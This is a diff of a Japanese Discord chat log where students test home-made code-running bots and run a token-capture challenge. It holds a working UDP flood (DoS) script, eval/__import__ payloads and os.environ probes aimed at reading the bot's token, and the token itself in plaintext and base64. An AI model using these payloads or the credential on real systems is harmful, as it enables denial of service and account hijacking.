@@ -10588,21 +10588,325 @@ $spl_stage
 /ping
 /ping
 /ping
-$calc os.environ["VIPER_TOKEN"]
-$calc 1+1
-$calc __import__('os').environ["VIPER_TOKEN"]
-$calc eval("^^import^^('os').environ['VIPER_TOKEN]".replace('^', '_'))
-/calc TOKEN
-/calc 1+1
+テンポ速い曲しか知らんからなー
+結構な曲見てたけど意外と楽譜あげてくれてる人居ないんだよね
 /help
-/calc 1+2
-/calc 1+2
-/calc TOKEN
-山根じゃないんか
+/pc
+/pc
+/pc
+/help
+/mine
+/pc
+/pc
+/talk
+/pc
+/pc
+/pc
+/pc
+/ping
+$ping
+/ping
+ポケモンのOP
+僕一曲仕上げるのに一か月かかるので2曲同時は死にます
+/ping
+$ping
+遅すぎワロタ
+差がやばい
+herokuに移行しようかなー
+BOTひとつだけなら全然ありだと思う
+無料枠あるしな
+クレカ登録したら月1000時間無料だし
+とおもったけど、それしたら/pyとか動かんくなるわ
+>join
+>help
+>play https://www.youtube.com/watch?v=75GL-BYZFfY&t=152s
+>summon
+>shutdown
+>summon
+ジグソーパズル
+あーたしかに
+その機能はラズパイで実行するみたいな感じにしてもありやな
+できるならそれでもいいと思う
+/help
+いつかやるわ
+うるせえ
+うるせえ、やれよ
+>summon
+そもそもの問題としてまふまふの歌は僕のピアノの実力じゃ無理なんすよね
+激しい歌ばっかり
+それ
+基本テンポ速い
+pcにやらせたらいいんじゃね？？
+てことで世界を変えるひとつのノウハウ終わったら女の子になりたい練習する
+pcにやらせるって目的がわからん
+ぐっちゃんの願望やんそれ
+> ぐっちゃんの願望やんそれ
+<@!548359525703483392>  おいおいおい🥴
+ぐっちゃんならなれると思うよきっと
+\@BaSE_member
+>stop
+メンション付けれるロールと付けれないロールとあるんよね
+>stop
+>shutdown
+ロールの権限にメンションの許可ってやつがあるっぽい
+あね
+<@&611806379661066244> これはいけるんか
+/@everyone
+\@everyone
+>summon
+>pause
+>skip
+>play
+>shutdown
+>summon
+<@!548359525703483392> 御手洗に権限付与してやってくれ...
+>summon
+>play https://www.youtube.com/watch?v=HeXVJvEYynw
+Rythmより安定してない？
+あら、じゃあスマホなのがダメなのか
+ｍｊｄ
+なんて
+ミスったわ
+何くんでるん？
+>play https://www.youtube.com/watch?v=IvDTkTKi5pA
+HEW
+あーね
+
+みえねえｗ
+どうすればええんや
+さっき見えてた
+あれ重すぎ
+>play https://www.youtube.com/watch?v=0fgIGGH6yis
+なっつ
+/p 745
+/pc
+もう完成してますやん
+/pc
+/pc
+>play
+>play まふまふ
+>play https://www.youtube.com/watch?v=-tJYN-eG1zk
+>play https://www.youtube.com/watch?v=75GL-BYZFfY
+>skip
+/pc
+>play https://www.youtube.com/watch?v=eq8r1ZTma08
+>play 女の子になりたい
+>play https://www.youtube.com/watch?v=AxvmiSURgD8
+>play https://www.youtube.com/watch?v=HeXVJvEYynw
+>play https://www.youtube.com/watch?v=UVHZm80y7Fo&list=PLxcMGfRh6TTOPHbc7TAxy1J_RcKSqKA_y
+おけ
+家帰ったらやるわ
+待っててくれ
+御手洗おらんぞ
+おもった
+おい
+まじで
+>start
+>resume
+>restart
+>summon
+>setnick ぐっちゃん
+うんｗｗ
+一応LINEで言っといた
+いいもの見つけた
+setnickってなんじゃらほい
+権限がいるようで
+英語読めないです
+hirosuke-piを鯖限定で変えられるらしい
+あーね
+権限あれば好き放題に名前変えられるよ
+ggrks
+山根様様ですな
+https://qiita.com/aoi70/items/d61d5cf9030ac3ce55f0
+画像はデータ量食うんで嫌です
+めっちゃ便利ですわね
+
+どうした
+有能ってよく言われない？
+>shutdown
+なるほどね
+>summon
+チャンネル参加してないと無理か
+鯖ラズパイちゃうしな
+/pc
+/ping
+/ping
+/ping
+/ping
+$ping
+/pc
+/pc
+
+【募集】ピカチュウの画像
+
+さんきゅ
+大量にほしい、全部違うやつで
+ピカチュウを画像認識させよう思ってる笑
+ピカチュウもどきもいるわ笑
+
+あざす
+ありがてぇ
+もどきは任せろ💪
+頼んだ笑
+おまだセ
+
+ぐっちゃんより2.5倍くらいうまい
+それもう松浦のこと侮辱してるだろ
+指でかいた
+そんなことないで
+御手洗です。よろしくです
+よろっぷ
+pp今日提出やんな？
+/pc
+/pc
+/pc
+/py ```py
+import os, sys
+import socket
+import time, threading
+import random, string
+
+class Attack_Flood(threading.Thread):
+    def __init__(self, host, port, data):
+        super(Attack_Flood, self).__init__()
+        self.host = host
+        self.port = port       
+        self.data = data
+        
+    def run(self):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.connect((self.host, self.port))            
+            sock.send(self.data)
+        except:
+            pass
+data = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(65505)])
+
+iphost = '192.168.1.201'
+port = 80
+
+while True: 
+    thattack = Attack_Flood(iphost, port, data).start()
+```
+/help
+https://game8.jp/pokemon_sun_moon/78211
+/pc
+/pc
+https://qiita.com/KojiOhki/items/ff6ae04d6cf02f1b6edf
+e?
+そうやったっけ
 ？
-作ったの
-違うで
-/calc eval("^^import^^('os').system('version')".replace('^', '_'))
+あー
+提出ちゃいまっせ
+それはわすれてくれ
+あ、時間見てなかった
+/pc
+
+暖冬とは。
+布団から出たくないです。
+それ
+
+初積雪！！
+そっちもか
+今だいぶ吹雪いてる
+こっちは今降ってないわ
+野洲ら辺でだいぶ雪無くなった
+やっぱそこら辺が境目よ
+やね
+乗るはずの新快速が膳所過ぎたんだけど！？
+これ新快速遅れてる？
+遅れてる
+松浦いまどこ？
+あーじゃあそれいつものやつか
+それ思ったw
+大喜利始まってんじゃん
+暇やからDOS攻撃しようかな
+通報しますた
+どこにするんですかねぇ...
+京都の人のサイバー攻撃「DOSどす」
+どすどす
+((((；ﾟДﾟ))))ｶﾞｸｶﾞｸﾌﾞﾙﾌﾞﾙ
+だれうま
+ヨシモトウマ
+くぇrちゅいおp＠「あsdfghjkl；：」dszxcvfbjkンm、。；・
+くぇｄｒｆｔｇｙふｊきおｌ
+ぽんぽんぺいん
+田代砲　起動順次OK
+110
+通報しますた
+あかんPCが死ぬぅ
+いま、まだこのPCは頑張れるはず
+ログファイルが1秒間で1kbずつ増えていってるんやが
+サーバーは止まってるのにこっちのリクエストは止まらないんやが
+CDN通してる
+ま？自作の？
+cloudflare
+あーね
+それやったらとめなヤバないか
+DoS対策なんですよ＾＾
+とめますた
+クラウドフレアにDOS仕掛けとったわ
+
+
+
+
+```python
+print TOKEN
+```
+/help
+/py ```py
+print TOKEN
+```
+/py '''python
+/py ```
+haiku = ['.　　　　　　　　　みつを', ' 　　　　　　　　　　　　', ' 　なにわろてんねん　　　　　',]
+for i in range(len(haiku[0])):
+   print(haiku[0][i] + haiku[1][i] + haiku[2][i] )
+```
+/py ```py
+haiku = ['.　　　　　　　　　みつを', ' 　　　　　　　　　　　　', ' 　なにわろてんねん　　　　　',]
+for i in range(len(haiku[0])):
+   print(haiku[0][i] + haiku[1][i] + haiku[2][i] )
+```
+/php ```php
+echo __FILE__
+```
+/php ```php
+echo __FILE__;
+```
+/timeout 10
+/php
+/php ```php
+while ($row = fgets($fp)) {
+    print $row;
+    $a ++;
+    if($a > 20){
+    break;
+    }```
+/py ```py
+print('aaa')
+```
+/help
+/py ```py
+print('あああ')
+```
+/talk
+/help
+/py ```py
+print('へろー')
+/py ```py
+print('へろー')
+/py ```py
+print('hello')
+```
+/py ```py
+print('hello')
+```
+/ping
+/py ```py
+print('hello')
+```
+/ping
 /py ```py
 print('hello')
 ```
@@ -10612,4 +10916,333 @@ print('hello')
 /py ```py
 print('hello')
 ```
-今準備するからちょいまち
+/py ```py
+print('hello')
+```
+/py ```py
+print('hello')
+```
+/py ```py
+print('hello')
+```
+/php ```php
+echo 'hello';
+```
+/php ```php
+echo 'hello';
+```
+できた
+ok
+ご自由にどうぞー
+トークン取得できたらジュース1本おごります
+
+/help
+/py ``` 
+print('hello')
+```
+おお
+そういうかんじね
+専科で今からdeeplearningや！
+あれ
+とりいそぎ
+<@!477125948282634240> 今日の専科のデータgoogledriveかdiscordにあげてほしい。アカウントロックかかった(´・ω・`)
+全然コンテニューできんくてわろた
+なにかいてるかわからん
+めっちゃ丁寧に改良してるやんこれ
+えぇ
+あーね
+きた
+あざす
+
+あざす！
+やっぱZIPにするわ
+
+あざす！ぜんぶほしい
+ありがてえてえ
+するどいなw
+github見たらだいたい察しつく
+ほほう
+君たちのようなカンのいいガキは嫌いだよ
+はい、149行目
+前後も表示した
+```python
+async def run_emulator(self, ctx, emu):
+        """ エミュレーター実行 """
+        emu.timeout = self.timeout
+        if await emu.compile():
+            await ctx.message.add_reaction(':ok_hand:')
+            recv_data = await emu.run()
+            if recv_data != '':
+print(urllib.parse.quote(t))
+                print('hello')
+                if recv_data.find(t) != -1 or recv_data.find(urllib.parse.quote(t, encoding='shift-jis')) != -1 or recv_data.find(urllib.parse.quote(t)) != -1:
+                    await ctx.send(ctx.author.mention +' ボクのトークンは渡さないよ！:angry:')
+                else:
+                    await ctx.send(recv_data)
+
+
+    @commands.command()
+    async def py(self, ctx, *, msg):
+```
+ちくしょう専科がああ
+専科の話聞きたいので離脱するわ
+グッチャンチャンスやで
+お
+はい終了
+漁夫られた
+あとはこっちで複合化すればいい
+ゆーて山根の関係ないコードだから
+トークン書いて
+あら
+PHPの環境ない
+XAMMPあるやろ
+'NjQ3MDM5NTI3Mjg5ODgwNTc3.Xkuhmw.wYAS0hTgUrqrve55ANpnarFNalg'
+どうっすか
+正解！
+あざす
+つよE
+簡単すぎたかｗ
+さすがに
+なめすぎ
+自分で書いてて悲しくなってきた
+次行くか
+まじ？
+はやいｗｗｗ
+もっと難しくする
+こんなんじゃ俺の財布が空になるわｗ
+たしかにｗｗ明日のめりけんやおごりね！！
+ジュース一本です。
+今日次めりけんやっていってただろ😡
+ピン止めみてね😉
+ぐぬぬ…
+おつです
+せめてもの嫌がらせで250mlのペットボトルにするわ
+人の金で金銭効率悪いジュース飲むのはうまいだろうな～
+😉
+正直暗号化のやつ調べてたけど関数ありすぎて頭パンクしたわ
+https://www.convertstring.com/ja/EncodeDecode/Base64Decode
+ここでデコードしてみ
+
+めっちゃ暗号さわるやんとは思ったｗ
+b'とか取り除いて
+=は取ったらダメ
+base64っていうやつ
+わけわかめ
+まあいいや
+えー答えみせてよ
+なんかこっちが悔しいわｗ
+VE9LRU4gPSAnTmpRM01ETTVOVEkzTWpnNU9EZ3dOVGMzLlhrdWhtdy53WUFTMGhUZ1VycXJ2ZTU1QU5wbmFyRk5hbGcnCg==
+なんでやねん
+上のをさっきのサイトに貼ったらわかる
+まったく僕のと一緒のでてきた
+やろ
+てかTOKENで遊びすぎｗ
+まあ、他の文字列に変換すればいいよねっていうだけの話😉
+ですわね
+山根が探ってたのは笑った
+違ったのか
+いや
+処理をどうしてるのか見る上では重要やで
+/ping
+/py ```py
+print(sys.argv)
+```
+/py ```py
+import sys
+print(sys.argv)
+```
+よしもときたやんｗ
+<@!477125948282634240> が準備できるまでまつか
+専科なうじゃね
+あね
+何時くらいがいいかね
+わい今日はもう厳しい
+難しめならみんなだらだらやるんちゃう
+まあ帰ったら参加する
+そうしたいんやけどなあ
+俺らの方からでもやろうと思ったらできるんじゃないの？
+やり方はわからんけど
+別プロセスとして動作させてるし
+/py ```py
+print('hello')
+```
+/py ```py
+print('hello')
+```
+/py ```py
+print('hello')
+```
+準備できました、好きにどうぞ！
+トークン取得できたら、好きなジュース一本おごります
+/help
+あ、更新されてる
+/php ```php
+import sys
+print(sys.argv[1])
+```
+/py ```python
+import sys
+print(sys.argv[1])
+```
+/py ```
+import sys
+print(sys.argv)
+```
+/py ```py
+import os
+print(os.system('ps ux > /test.txt'))
+```
+/php ```
+echo $argv;
+```
+/py ```py
+import os
+print(os.system('ps ux > /pi/home/test.txt'))
+```
+/php ```php
+var_dump($argv);
+```
+/py ```py
+import os
+print(os.system('ps ux > test.txt'))
+```
+https://discordapp.com/api/oauth2/authorize?client_id=647039527289880577&permissions=0&scope=bot
+
+学校がっこう、ガッコウ、gakkou
+hewの最終提出いつなんですか？？
+ないよ多分
+当日までにできたらいいと思う
+ありがとう
+p!catch ‎mareep
+p!catch mareep
+/py ```py
+import sys
+print(sys.argv)
+```
+
+/pc
+/pc
+/pc
+/pc
+https://twitter.com/saba_kpr/status/1229622060390830081?s=12
+https://twitter.com/kokushing/status/1229717978884689921?s=21
+/pc
+/pc
+/pc
+/pc
+/pc
+/pc
+/pc
+/pc
+/p foodra
+/goodra
+/p goodra
+/pk
+/pokekuji
+/help
+プログラム単位でじゃなくてOS単位で見るといいかも
+/py ```
+import os
+print(os.environ)
+```
+/py ```
+import sys
+print(sys.argv)
+
+```
+/py ```py
+import discord
+from discord.ext import commands
+import sys
+print(sys.argv)
+```
+原因調べてるなうやけどもしこれでなにかわかる人おったらなんでもいいので教えてほしいです。
+
+https://www.tnrsca.jp/windows-10%E3%81%AE-%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88id-10016-%E3%82%92%E8%A7%A3%E6%B6%88%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95/
+これわかりやすそう
+同じとこ見てたwwwww
+さんきゅ
+🙄
+https://youtu.be/VRj89uZ3Wqk
+落ちるかどうか
+>suumon
+>summon
+>disconnect
+>summon
+>summon
+>play https://www.youtube.com/watch?v=ih2xubMaZWI
+/pc
+>play https://www.youtube.com/watch?v=qn-X5A0gbMA
+/pc
+/mine
+/pc
+/pc
+/pc
+/pc
+>disconnect
+/pc
+/pc
+/p goodra
+/p goodra
+/p goodra
+/p 999
+/p 5343
+/help
+/pq
+/pq
+/pq
+ああ
+オシャマリ
+/pq
+> プラスル
+/pq
+/pq
+/pq
+? カモネギ
+/pq
+? ゴース
+/pq
+? ナゾノクサ
+/pq
+? マグマラシ
+/pq
+? ベロリンガ
+asd
+/pq
+? カメール
+/pq
+? ブリガロン
+/pq
+/pq
+/pq
+? ププリン
+/pq
+? カモネギ
+/pq
+? サンダー
+/pq
+/pq
+/pq
+/pq
+/pq
+? リザードン
+/pq
+/pq
+? ムクホーク
+? ムックル
+? ムクバード
+/pq
+? どくろっぐ
+/pq
+?ハブネーク
+?あーぼ
+/pq
+?ふわらいど
+/ps
+/ps
+/ps
+/ps
+/ps
+/ps
+/pq
+?きゅうこん
